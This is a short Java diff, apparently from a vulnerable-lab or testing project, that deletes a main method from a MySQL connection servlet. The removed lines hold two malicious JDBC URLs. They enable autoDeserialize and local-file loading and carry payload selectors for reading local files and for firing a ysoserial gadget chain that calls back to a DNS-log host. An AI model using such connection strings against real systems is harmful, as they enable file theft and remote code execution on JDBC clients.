@@ -41,10 +41,5 @@ public class MysqlConnectServlet extends HttpServlet {
 
     }
 
-    public static void main(String[] args) throws Exception {
 
-        String db_url = "jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&maxAllowedPacket=655360&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&allowUrlInLocalInfile=true&user=fileread_file:///";
-        String test="jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&maxAllowedPacket=655360&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&allowUrlInLocalInfile=true&user=yso_FindGd_all:bb.testzz.dnslog.pw&pass=123456";
-        DriverManager.getConnection(test);
-    }
 }
